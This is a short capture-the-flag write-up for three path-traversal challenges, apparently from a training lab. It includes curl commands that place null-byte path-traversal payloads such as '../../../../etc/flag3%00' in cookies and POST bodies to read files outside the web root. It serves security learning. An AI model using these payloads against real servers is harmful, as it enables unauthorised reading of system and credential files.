# Path traversal

## Challenge 1
Change HTML form from `GET` to `POST` and input the relative path of flag1

## Challenge 2
Use curl to send a `POST` request to the login page with the following parameters:
```sh
curl http://10.82.135.74/challenges/chall2.php -H "Cookie: THM=../../../../etc/flag2%00" --output result.txt
```

## Challenge 3
I copied the cURL command for bash from Chrome, changed the THM to flag3 and replaced the end of --data-raw from %2500 to %00. It didn't work otherwise and still included the .php to the filename.
```sh
curl 'http://10.82.142.65/challenges/chall3.php' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7' \
  -H 'Cache-Control: no-cache' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'THM=../../../../etc/flag3%00;' \
  -H 'DNT: 1' \
  -H 'Origin: http://10.82.142.65' \
  -H 'Pragma: no-cache' \
  -H 'Referer: http://10.82.142.65/challenges/chall3.php?file=..%2F..%2F..%2F..%2Fetc%2Fflag3%2500' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36' \
  --data-raw 'file=..%2F..%2F..%2F..%2Fetc%2Fflag3%00' \
  --insecure --output flag3.html
```
